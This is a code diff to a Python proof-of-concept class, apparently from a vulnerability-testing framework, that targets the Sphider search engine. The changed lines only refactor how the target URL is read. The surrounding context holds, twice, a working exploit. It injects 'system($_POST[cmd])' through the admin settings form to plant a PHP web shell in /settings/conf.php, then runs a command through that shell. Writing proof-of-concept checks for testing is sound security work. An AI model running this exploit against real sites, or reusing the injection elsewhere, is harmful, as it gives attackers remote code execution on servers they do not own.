@@ -63,7 +63,7 @@ class Poc(ABPoc):
             request.add_header(
                 'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
             response = urllib.request.urlopen(request)
-            attack_url = args['options']['target'] + '/admin/admin.php'
+            attack_url = self.target + '/admin/admin.php'
             payload = "f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5"
             request = urllib.request.Request(attack_url, payload)
             request.add_header(
@@ -72,7 +72,7 @@ class Poc(ABPoc):
                 'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
             response = urllib.request.urlopen(request)
             content = str(response.read())
-            shell_url = args['options']['target'] + '/settings/conf.php'
+            shell_url = self.target + '/settings/conf.php'
             request = urllib.request.Request(
                 shell_url, "cmd=echo sphiderwebshell")
             response = urllib.request.urlopen(request)
@@ -100,7 +100,7 @@ class Poc(ABPoc):
             request.add_header(
                 'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
             response = urllib.request.urlopen(request)
-            attack_url = args['options']['target'] + '/admin/admin.php'
+            attack_url = self.target + '/admin/admin.php'
             payload = "f=settings&Submit=1&_version_nr=1.3.5&_language=en&_template=standard&_admin_email=admin%40localhost&_print_results=1&_tmp_dir=tmp&_log_dir=log&_log_format=html&_min_words_per_page=10&_min_word_length=3&_word_upper_bound=100;system($_POST[cmd])&_index_numbers=1&_index_meta_keywords=1&_pdftotext_path=c%3A%5Ctemp%5Cpdftotext.exe&_catdoc_path=c%3A%5Ctemp%5Ccatdoc.exe&_xls2csv_path=c%3A%5Ctemp%5Cxls2csv&_catppt_path=c%3A%5Ctemp%5Ccatppt&_user_agent=Sphider&_min_delay=0&_strip_sessids=1&_results_per_page=10&_cat_columns=2&_bound_search_result=0&_length_of_link_desc=0&_links_to_next=9&_show_meta_description=1&_show_query_scores=1&_show_categories=1&_desc_length=250&_did_you_mean_enabled=1&_suggest_enabled=1&_suggest_history=1&_suggest_rows=10&_title_weight=20&_domain_weight=60&_path_weight=10&_meta_weight=5"
             request = urllib.request.Request(attack_url, payload)
             request.add_header(
@@ -109,7 +109,7 @@ class Poc(ABPoc):
                 'Cookie', "PHPSESSID=4s96uquj98anhnlm3k2fitpm32")
             response = urllib.request.urlopen(request)
             content = str(response.read())
-            shell_url = args['options']['target'] + '/settings/conf.php'
+            shell_url = self.target + '/settings/conf.php'
             request = urllib.request.Request(
                 shell_url, "cmd=echo sphiderwebshell")
             response = urllib.request.urlopen(request)
